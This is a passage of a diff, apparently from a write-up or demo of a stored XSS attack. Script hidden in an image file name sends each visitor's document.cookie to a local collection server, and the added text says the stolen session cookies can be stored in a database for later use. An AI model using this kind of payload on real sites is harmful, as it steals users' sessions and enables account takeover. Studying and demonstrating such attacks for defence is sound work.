@@ -24,4 +24,7 @@ a.open('GET', 'http://127.0.0.1:8082/incoming' + '?sessionId=' + document.cookie
 a.send();
 </script>".png
 
+Now everytime the user profile is loaded, the session cookies from the visitor will be sent to a remote server (check ./StaticServer) which can then store
+them in a DB for further use, etc.
+
 
